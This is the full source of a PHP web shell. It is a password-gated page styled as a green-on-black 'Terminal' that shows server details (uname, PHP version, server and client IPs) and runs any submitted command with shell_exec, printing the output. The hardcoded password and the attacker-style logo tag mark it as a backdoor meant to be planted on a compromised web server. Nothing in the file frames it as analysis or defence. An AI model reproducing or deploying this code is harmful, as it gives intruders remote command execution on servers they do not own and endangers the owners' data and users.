<?php
header("Content-Type: text/html; charset=UTF-8");
$correct_password = "logsfile"; // Ganti dengan password yang diinginkan
$authenticated = isset($_POST['password']) && $_POST['password'] === $correct_password;
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Terminal</title>
    <style>
        body {
            background-color: black;
            color: lime;
            font-family: monospace;
            padding: 20px;
            position: relative;
        }
        .output, .command-input, .password-input {
            background-color: #222;
            padding: 10px;
            border-radius: 5px;
            border: 1px solid lime;
            margin-top: 10px;
        }
        .output pre {
            margin: 0;
        }
        input {
            background: black;
            color: lime;
            border: none;
            font-family: monospace;
            width: 100%;
            outline: none;
            padding: 5px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 10px;
        }
        th, td {
            border: 1px solid lime;
            padding: 8px;
            text-align: left;
        }
        .logo {
            position: absolute;
            top: 10px;
            right: 10px;
            color: lime;
            font-size: 14px;
            text-align: right;
            white-space: pre;
        }
        .image-logo {
            text-align: center;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="logo">
        SKYb856E
    </div>
    <h2>Server Info</h2>
    <table>
        <tr><th>Property</th><th>Value</th></tr>
        <tr><td>Uname</td><td><?php echo php_uname(); ?></td></tr>
        <tr><td>PHP Version</td><td><?php echo phpversion(); ?></td></tr>
        <tr><td>Server Software</td><td><?php echo $_SERVER['SERVER_SOFTWARE']; ?></td></tr>
        <tr><td>Server IP</td><td><?php echo $_SERVER['SERVER_ADDR']; ?></td></tr>
        <tr><td>Client IP</td><td><?php echo $_SERVER['REMOTE_ADDR']; ?></td></tr>
    </table>
    
    <?php if (!$authenticated): ?>
    <div class="password-input">
        <form method="post">
            <label>Enter Password: </label>
            <input type="password" name="password" autofocus>
            <input type="submit" value="Submit">
        </form>
    </div>
    <div class="image-logo">
        <img src="https://i.postimg.cc/kgvXGpjV/DALL-E-2024-12-01-13-14-58-A-tomboy-girl-with-neck-length-hair-and-subtle-tattoos-wearing-a-futur.webp" alt="Logo" width="500">
    </div>
    <?php else: ?>
    <div class="command-input">
        <form method="post">
            <input type="hidden" name="password" value="<?php echo htmlspecialchars($_POST['password']); ?>">
            <label>$ </label>
            <input type="text" name="cmd" autofocus>
            <input type="submit" value="Run">
        </form>
    </div>
    
    <div class="output">
        <h3>Command Output</h3>
        <?php
        if (!empty($_POST['cmd'])) {
            $cmd = $_POST['cmd'];
            echo "<strong>Command:</strong> " . htmlspecialchars($cmd) . "<br>";
            echo "<pre>" . shell_exec($cmd) . "</pre>";
        }
        ?>
    </div>
    <?php endif; ?>
</body>
</html>
